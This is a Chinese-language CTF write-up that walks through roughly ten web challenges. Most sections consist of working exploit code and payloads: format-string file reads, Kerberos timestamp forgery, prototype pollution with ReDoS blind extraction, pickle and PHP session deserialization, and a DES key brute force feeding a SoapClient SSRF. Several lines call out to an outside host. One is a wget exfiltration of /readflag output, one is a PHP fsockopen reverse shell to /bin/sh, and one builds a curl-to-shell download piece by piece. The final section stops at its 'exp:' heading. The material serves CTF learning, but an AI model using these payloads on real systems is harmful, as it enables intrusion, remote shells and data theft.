<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> web</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"><span class="keyword">from</span> base.readfile <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">urls = (</span><br><span class="line">    <span class="string">'/'</span>, <span class="string">'help'</span>,</span><br><span class="line">    <span class="string">'/read/(.*)'</span>,<span class="string">'read'</span></span><br><span class="line">)</span><br><span class="line">web.config.debug = <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">help</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GET</span><span class="params">(self)</span>:</span></span><br><span class="line">        help_information = <span class="string">'''</span></span><br><span class="line"><span class="string">        Welcome to our FMKQ api, you could use the help information below</span></span><br><span class="line"><span class="string">        To read file:</span></span><br><span class="line"><span class="string">            /read/file=example&amp;vipcode=example</span></span><br><span class="line"><span class="string">            if you are not vip,let vipcode=0,and you can only read /tmp/&#123;file&#125;</span></span><br><span class="line"><span class="string">        Other functions only for the vip!!!</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        <span class="keyword">return</span> help_information</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">read</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GET</span><span class="params">(self,text)</span>:</span></span><br><span class="line">        file2read = readfile(text)</span><br><span class="line">        <span class="keyword">if</span> file2read.test() == <span class="keyword">False</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> file2read.isvip() == <span class="keyword">False</span>:</span><br><span class="line">                <span class="keyword">return</span> (<span class="string">"The content of "</span>+ file2read.GetFileName() +<span class="string">" is &#123;file&#125;"</span>).format(file=file2read)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                vipfile2read = vipreadfile(file2read)</span><br><span class="line">                <span class="keyword">return</span> (str(vipfile2read))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app = web.application(urls, globals())</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
<p>path中不能有fl4g，但是读取flag必定会吧上一级当成path，<br>发现vipfile和file一样存在格式化字符串漏洞，想到构造一个f绕过对fl4g的过滤，<br>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=http://localhost:8080/read/file=&#123;vipfile.__class__.__init__.__globals__[vipreadfile].__module__[9]&#125;l4g_1s_h3re_u_wi11_rua/flag%26vipcode=uJvFXyqiHnztNQBU10TYkepKjAh7xVMfmgdS4G9r5sWa6loL&amp;head=\&amp;begin=%s%</span><br></pre></td></tr></table></figure>
<p>flag:<br>flag{qoSF2nKvwoGRI7aJ}</p>
<h2 id="Dooog"><a href="#Dooog" class="headerlink" title="Dooog"></a>Dooog</h2><p>通读代码，看起来是个kerberos协议<br>核心就是伪造一个时间戳，绕过对cmd的验证<br><img src="https://i.loli.net/2020/03/10/1WcsSOX9FDmMe6l.png" alt="dooog1.png"><br>然后直接/readflag<br>exp：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    username =&quot;xishir&quot;</span><br><span class="line">    master_key = &quot;12345678&quot;</span><br><span class="line">    cmd = &quot;wget xxxx/`/readflag`&quot;</span><br><span class="line">    cryptor = AESCipher(master_key)</span><br><span class="line">    authenticator = cryptor.encrypt(json.dumps(&#123;&apos;username&apos;:username, &apos;timestamp&apos;: int(time.time())&#125;))</span><br><span class="line">    res = requests.post(&apos;http://121.37.164.32:5001/getTGT&apos;, data=&#123;&apos;username&apos;: username, &apos;authenticator&apos;: base64.b64encode(authenticator)&#125;)</span><br><span class="line">    print res.text</span><br><span class="line">    session_key, TGT = cryptor.decrypt(base64.b64decode(res.content.split(&apos;|&apos;)[0])), res.content.split(&apos;|&apos;)[1]</span><br><span class="line">    cryptor = AESCipher(session_key)</span><br><span class="line">    authenticator = cryptor.encrypt(json.dumps(&#123;&apos;username&apos;: username, &apos;timestamp&apos;: int(time.time())-61&#125;))</span><br><span class="line">    res = requests.post(&apos;http://121.37.164.32:5001/getTicket&apos;,  data=&#123;&apos;username&apos;: username, &apos;cmd&apos;: cmd, &apos;authenticator&apos;: base64.b64encode(authenticator), &apos;TGT&apos;: TGT&#125;)</span><br><span class="line">    print res.text</span><br><span class="line">    client_message, server_message = res.content.split(&apos;|&apos;)</span><br><span class="line"></span><br><span class="line">    session_key = cryptor.decrypt(base64.b64decode(client_message))</span><br><span class="line">    </span><br><span class="line">    cryptor = AESCipher(session_key)</span><br><span class="line">    authenticator = base64.b64encode(cryptor.encrypt(username))</span><br><span class="line">    res = requests.post(&apos;http://121.37.164.32:5002/cmd&apos;, data=&#123;&apos;server_message&apos;: server_message, &apos;authenticator&apos;: authenticator&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="GuessGame"><a href="#GuessGame" class="headerlink" title="GuessGame"></a>GuessGame</h2><p><a href="http://121.37.179.47:8081/static/app.js" target="_blank" rel="noopener">http://121.37.179.47:8081/static/app.js</a> 有后端源码</p>
<p>用<code>ADmin888</code>大小写绕过admin的检查，<br>merge存在原型链污染，可以把config.enableReg改成true，<br>构造</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;user&quot;:&#123;&quot;username&quot;:&quot;ADmin888&quot;,&quot;__proto__&quot;: &#123;&quot;enableReg&quot;: true&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>然后可以控制进行一次正则匹配，因为没有任何回显，猜测是要redos进行延时盲注<br><img src="https://i.loli.net/2020/03/10/3An2NUWVeRxYp1z.png" alt="guess.png"></p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">flag = <span class="string">"g3"</span></span><br><span class="line">ext = <span class="string">"zY"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    alls = []</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> <span class="string">"&#123;&#125;_0123456789abcdefghijklmnopqestuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>:</span><br><span class="line">        t = time.time()</span><br><span class="line">        headers = &#123;<span class="string">'Content-Type'</span>: <span class="string">'application/json'</span>&#125;</span><br><span class="line">        payload = <span class="string">"""&#123;"q":"^((.*)+)+[^%s]%s$","tmp":"%d"&#125;"""</span> % (f, ext, t)</span><br><span class="line">        <span class="comment">#payload = """&#123;"q":"^(((.*)+?)+?)+?[^%s]%s$","tmp":"%d"&#125;""" % (f, ext, t)</span></span><br><span class="line">        <span class="comment">#print payload</span></span><br><span class="line">        r = requests.post(url=<span class="string">"http://121.37.179.47:8081/verifyFlag"</span>, headers=headers, data=payload)</span><br><span class="line">        tt = time.time() - t</span><br><span class="line">        alls.append(&#123;<span class="string">"time"</span>:tt,<span class="string">"v"</span>:f&#125;)</span><br><span class="line">        <span class="keyword">print</span> f,tt,r,len(r.text),payload</span><br><span class="line"></span><br><span class="line">    alls.sort()</span><br><span class="line">    ext = alls[<span class="number">-1</span>][<span class="string">"v"</span>] + ext</span><br><span class="line">    <span class="keyword">print</span> alls[<span class="number">-3</span>:]</span><br><span class="line">    <span class="keyword">print</span> i, flag, ext</span><br></pre></td></tr></table></figure>
<p>服务器一触发redos就挂，挂一台跑一位出来（运维大哥别打我<br>最后跑出结果<code>g3tFLAaGEAxY</code>，<br>flag：flag{g3tFLAaGEAxY}</p>
<p>后来发现题目超时就断开了，更容易跑了。。</p>
<h2 id="PHP-UAF"><a href="#PHP-UAF" class="headerlink" title="PHP-UAF"></a>PHP-UAF</h2><p>PHP 7.4.2，直接用现成exp打<br><a href="https://github.com/mm0r1/exploits" target="_blank" rel="noopener">https://github.com/mm0r1/exploits</a><br><img src="https://i.loli.net/2020/03/10/qyQlDtfoXRPJWaU.png" alt="uaf1.png"><br><img src="https://i.loli.net/2020/03/10/3XBGSrfZAikdboY.png" alt="uaf2.png"></p>
<h2 id="happyvacation"><a href="#happyvacation" class="headerlink" title="happyvacation"></a>happyvacation</h2><p><a href="http://159.138.4.209:1002/.git" target="_blank" rel="noopener">http://159.138.4.209:1002/.git</a> git泄露源码<br>审计代码发现答题的地方有个eval，answer参数有几个过滤，不能直接命令注入<br><img src="https://i.loli.net/2020/03/10/o76XeFMPqwRJVrm.png" alt="hv1.png"><br>但是看到this-&gt;user引入了上一层的<code>$user</code>，想到另外还有个上传点，于是构造<br><img src="https://i.loli.net/2020/03/10/MflbKRHQJrNcYyA.png" alt="hv2.png"><br>把uploader中的上传后缀黑名单清除，就能上传php文件了<br><img src="https://i.loli.net/2020/03/10/LQMReVptW17Ckhn.png" alt="hv3.png"><br><img src="https://i.loli.net/2020/03/10/j2IesPEaBAzNLyR.png" alt="hv4.png"><br>最后直接读取/flag<br><img src="https://i.loli.net/2020/03/10/qkLXJn9pGKb6EM4.png" alt="hv5.png"></p>
<p>所以提示里的bot是啥玩意？</p>
<p>自欺欺人md5验证码又是啥玩意？<br><img src="https://i.loli.net/2020/03/10/47y8PbxiM2muE96.png" alt="hv6.png"></p>
<h2 id="nothardweb"><a href="#nothardweb" class="headerlink" title="nothardweb"></a>nothardweb</h2><p>他key是mt_rand &amp; 0x5f5e0ff<br>0x5f5e0ff = 0b101111101011110000011111111<br>0的地方必然是0 也就是1的地方有两个可能 一共19个1，2**19 54w次也不多<br>如果爆破出来的key是对的 那么就能正常解密出来后面几组的数据 因为后面几组不需要iv的参与<br>就是可能得倒着解密<br>最后得到第一组密文之后直接异或明文就得到iv了</p>
<p>爆破key</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cccc=<span class="string">"%d0%d%d%d%d%d0%d0%d%d%d%d00000%d%d%d%d%d%d%d%d"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($a=<span class="number">0</span>; $a &lt; <span class="number">2</span>; $a++) &#123; </span><br><span class="line">    <span class="keyword">for</span> ($b=<span class="number">0</span>; $b &lt; <span class="number">2</span>; $b++) &#123; </span><br><span class="line">        <span class="keyword">for</span> ($c=<span class="number">0</span>; $c &lt; <span class="number">2</span>; $c++) &#123; </span><br><span class="line">            <span class="keyword">for</span> ($d=<span class="number">0</span>; $d &lt; <span class="number">2</span>; $d++) &#123; </span><br><span class="line">                <span class="keyword">for</span> ($e=<span class="number">0</span>; $e &lt; <span class="number">2</span>; $e++) &#123; </span><br><span class="line">                    <span class="keyword">for</span> ($f=<span class="number">0</span>; $f &lt; <span class="number">2</span>; $f++) &#123; </span><br><span class="line">                        <span class="keyword">for</span> ($g=<span class="number">0</span>; $g &lt; <span class="number">2</span>; $g++) &#123; </span><br><span class="line">                            <span class="keyword">for</span> ($h=<span class="number">0</span>; $h &lt; <span class="number">2</span>; $h++) &#123; </span><br><span class="line">                                <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; <span class="number">2</span>; $i++) &#123; </span><br><span class="line">                                    <span class="keyword">for</span> ($j=<span class="number">0</span>; $j &lt; <span class="number">2</span>; $j++) &#123; </span><br><span class="line">                                        <span class="keyword">for</span> ($k=<span class="number">0</span>; $k &lt; <span class="number">2</span>; $k++) &#123; </span><br><span class="line">                                            <span class="keyword">for</span> ($l=<span class="number">0</span>; $l &lt; <span class="number">2</span>; $l++) &#123; </span><br><span class="line">                                                <span class="keyword">for</span> ($m=<span class="number">0</span>; $m &lt; <span class="number">2</span>; $m++) &#123; </span><br><span class="line">                                                    <span class="keyword">for</span> ($n=<span class="number">0</span>; $n &lt; <span class="number">2</span>; $n++) &#123; </span><br><span class="line">                                                        <span class="keyword">for</span> ($o=<span class="number">0</span>; $o &lt; <span class="number">2</span>; $o++) &#123; </span><br><span class="line">                                                            <span class="keyword">for</span> ($p=<span class="number">0</span>; $p &lt; <span class="number">2</span>; $p++) &#123; </span><br><span class="line">                                                                <span class="keyword">for</span> ($q=<span class="number">0</span>; $q &lt; <span class="number">2</span>; $q++) &#123; </span><br><span class="line">                                                                    <span class="keyword">for</span> ($r=<span class="number">0</span>; $r &lt; <span class="number">2</span>; $r++) &#123; </span><br><span class="line">                                                                        <span class="keyword">for</span> ($s=<span class="number">0</span>; $s &lt; <span class="number">2</span>; $s++) &#123; </span><br><span class="line">                                                                            $f_key=sprintf($cccc,$a,$b,$c,$d,$e,$f,$g,$h,$i,$j,$k,$l,$m,$n,$o,$p,$q,$r,$s);</span><br><span class="line">                                                                            $key=base_convert($f_key,<span class="number">2</span>,<span class="number">10</span>);</span><br><span class="line">                                                                            $result=decode_aes($key);</span><br><span class="line">                                                                            <span class="keyword">if</span>(stripos($result,<span class="string">"guest"</span>))&#123;</span><br><span class="line">                                                                                <span class="keyword">echo</span> $result;</span><br><span class="line">                                                                                <span class="keyword">echo</span> $key.<span class="string">"\n"</span>;</span><br><span class="line">                                                                            &#125;</span><br><span class="line">                                                                        &#125;</span><br><span class="line">                                                                    &#125;</span><br><span class="line">                                                                &#125;</span><br><span class="line">                                                            &#125;</span><br><span class="line">                                                        &#125;</span><br><span class="line">                                                    &#125;</span><br><span class="line">                                                &#125;</span><br><span class="line">                                            &#125;</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode_aes</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">    $ch=base64_decode(<span class="string">"NGtWc0JCQ080dkNxcnhtVjVOSG1rQ3hWckRab3pjWkllTmdJMmovclR4YktzNk9FTERBSnYxSUNKVmQ4Qk55Qg=="</span>);</span><br><span class="line">    $de = openssl_decrypt($ch,<span class="string">"des-cbc"</span>,$key,<span class="number">0</span>,<span class="string">"abcdabcd"</span>);</span><br><span class="line">    <span class="keyword">return</span> $de;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>得到key之后逆推iv即可，然后构造soap反序列化ssrf即可</p>
<p>最后的payload : </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$key=<span class="string">"17834064"</span>;</span><br><span class="line">$iv=<span class="string">"85196940"</span>;</span><br><span class="line">$a = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'uri'</span>=&gt;<span class="string">'http://10.10.1.12/index.php'</span>, <span class="string">'location'</span>=&gt;<span class="string">'http://10.10.1.12/index.php?cc=`$cc`;php+-r+%27%24sock%3Dfsockopen%28%22????%22%2C????%29%3Bexec%28%22%2Fbin%2Fsh+-i+%3C%263+%3E%263+2%3E%263%22%29%3B%27;'</span>));</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(openssl_encrypt($b,<span class="string">"des-cbc"</span>,$key,<span class="number">0</span>,$iv)).<span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> md5($b);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>直接用php弹shell了</p>
<p>然后发现根目录有个hint文件 </p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200309210338-6449892e-6206-1.png" alt="image.png"></p>
<p>传个ew进去开隧道康康发现是个tomcat，可以直接put一个shell上去</p>
<p>然后就没有然后了，flag在根目录下</p>
<h2 id="webtmp"><a href="#webtmp" class="headerlink" title="webtmp"></a>webtmp</h2><p>pickle反序列化题，参考之前SUCTF 2019那题。</p>
<p>需要满足 result == Animal(secret.name, secret.category)</p>
<p>限制反序列化的class所属module为：<strong>main</strong></p>
<p>目标：<br>覆写<code>__main__.secret.name</code>为任意值（例如：aaa）<br>覆写<code>__main__.secret.category</code>为任意值（例如：bbb）<br>反序列化一个<code>__main__.Animal</code>的实例，令<code>self.name为aaa，self.category</code>为<code>bbb</code>。</p>
<p>Payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\x80\x03</span><br><span class="line">c__main__\nsecret\nN(S&apos;name&apos;\nS&apos;aaa&apos;\nd\x86b</span><br><span class="line">c__main__\nsecret\nN(S&apos;category&apos;\nS&apos;bbb&apos;\nd\x86b</span><br><span class="line">c__main__\nAnimal\nq\x00)\x81q\x01&#125;q\x02(X\x04\x00\x00\x00nameq\x03X\x03\x00\x00\x00aaaq\x04X\x08\x00\x00\x00categoryq\x05X\x03\x00\x00\x00bbbq\x06ub.</span><br></pre></td></tr></table></figure>
<p>Base64编码后：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gANjX19tYWluX18Kc2VjcmV0Ck4oUyduYW1lJwpTJ2FhYScKZIZiY19fbWFpbl9fCnNlY3JldApOKFMnY2F0ZWdvcnknClMnYmJiJwpkhmJjX19tYWluX18KQW5pbWFsCnEAKYFxAX1xAihYBAAAAG5hbWVxA1gDAAAAYWFhcQRYCAAAAGNhdGVnb3J5cQVYAwAAAGJiYnEGdWIu</span><br></pre></td></tr></table></figure></p>
<p>提交拿到Flag：<br>flag{409ed945-5b77-4ec3-97e1-b395778842ba}</p>
<h2 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h2><p>源码泄漏：<a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></p>
<p>下载源码代码审计，在签名处存在反序列化漏洞，只要用户名为admin就能访问/core/index.php</p>
<p> php在获取 session 的时候，会按照 session.serialize_handler=php 规则来处理 session 文件，将 | 符号之前的所有内容认为是键名，之后的内容则用于反序列化。<br> <a href="https://blog.csdn.net/weixin_44304686/article/details/91539645" target="_blank" rel="noopener">参考链接</a></p>
<p>构造payload：<br>O:4:”info”:2:{s:5:”admin”;i:1;s:4:”sign”;s:4:”test”;}</p>
<p>获取/core/index.php的内容，并发现是4字符getshell和data协议<br>。<a href="https://blog.csdn.net/qq_27446553/article/details/78502337?utm_source=blogxgwz6" target="_blank" rel="noopener">参考链接</a></p>
<p>data协议利用:<br>compress.zlib://data:@127.0.0.1/127.0.0.1?plain;base64,xxxxx;</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python 2.7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hackhttp</span><br><span class="line"></span><br><span class="line">hh = hackhttp.hackhttp()</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">vps = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">ip = <span class="string">'0x'</span> + <span class="string">''</span>.join([str(hex(int(i))[<span class="number">2</span>:].zfill(<span class="number">2</span>))<span class="keyword">for</span> i <span class="keyword">in</span> vps.split(<span class="string">'.'</span>)])</span><br><span class="line"></span><br><span class="line">pos0 = <span class="string">'e'</span></span><br><span class="line"></span><br><span class="line">pos1 = <span class="string">'h'</span></span><br><span class="line"></span><br><span class="line">pos2 = <span class="string">'g'</span> </span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line"></span><br><span class="line">    <span class="string">'&gt;dir'</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">'&gt;%s\&gt;'</span> % pos0,</span><br><span class="line"></span><br><span class="line">    <span class="string">'&gt;%st-'</span> % pos1,</span><br><span class="line"></span><br><span class="line">    <span class="string">'&gt;sl'</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">'*&gt;v'</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">'&gt;rev'</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">'*v&gt;%s'</span> % pos2,</span><br><span class="line"></span><br><span class="line">    <span class="string">'&gt;p'</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">'&gt;ph\\'</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">'&gt;1.\\'</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">'&gt;\&gt;\\'</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">'&gt;%s\\'</span> % ip[<span class="number">8</span>:<span class="number">10</span>],</span><br><span class="line"></span><br><span class="line">    <span class="string">'&gt;%s\\'</span> % ip[<span class="number">6</span>:<span class="number">8</span>],</span><br><span class="line"></span><br><span class="line">    <span class="string">'&gt;%s\\'</span> % ip[<span class="number">4</span>:<span class="number">6</span>],</span><br><span class="line"></span><br><span class="line">    <span class="string">'&gt;%s\\'</span> % ip[<span class="number">2</span>:<span class="number">4</span>],</span><br><span class="line"></span><br><span class="line">    <span class="string">'&gt;%s\\'</span> % ip[<span class="number">0</span>:<span class="number">2</span>],</span><br><span class="line"></span><br><span class="line">    <span class="string">'&gt;\ \\'</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">'&gt;rl\\'</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">'&gt;cu\\'</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">'sh '</span> + pos2,</span><br><span class="line"></span><br><span class="line">    <span class="string">'sh '</span> + pos0,</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">tmp = <span class="string">'''POST /core/ HTTP/1.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Host: http://121.36.222.22:88</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Content-Length: 77</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Pragma: no-cache</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Cache-Control: no-cache</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Origin: http://121.36.222.22:88</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Referer: http://121.36.222.22:88/core/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=&#123;session&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">url=compress.zlib%3A%2F%2Fdata%3A%40127.0.0.1%2Fplain%3Bbase64%2C&#123;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line"></span><br><span class="line">    print(base64.b64encode(i).replace(<span class="string">'+'</span>,<span class="string">"%2B"</span>).replace(<span class="string">"="</span>,<span class="string">"%3D"</span>))</span><br><span class="line"></span><br><span class="line">    data = tmp.format(base64.b64encode(i).replace(<span class="string">'+'</span>,<span class="string">"%2B"</span>).replace(<span class="string">"="</span>,<span class="string">"%3D"</span>))</span><br><span class="line"></span><br><span class="line">    code, head, html, redirect, log = hh.http(<span class="string">'http://121.36.222.22:88/core/'</span>, raw=data)</span><br></pre></td></tr></table></figure>
<p>访问1.php并getflag</p>
<h2 id="nweb"><a href="#nweb" class="headerlink" title="nweb"></a>nweb</h2><p>注册用户</p>
<p>POST /regist.php HTTP/1.1<br>email=akkkw2&amp;pass=123456&amp;repass=b233gg&amp;type=110</p>
<p>参考注册页源代码，type改成110，注册一个有权限的账号。</p>
<p>/flag.php 有权限访问了</p>
<p>search.php存在盲注</p>
<p>exp:</p>
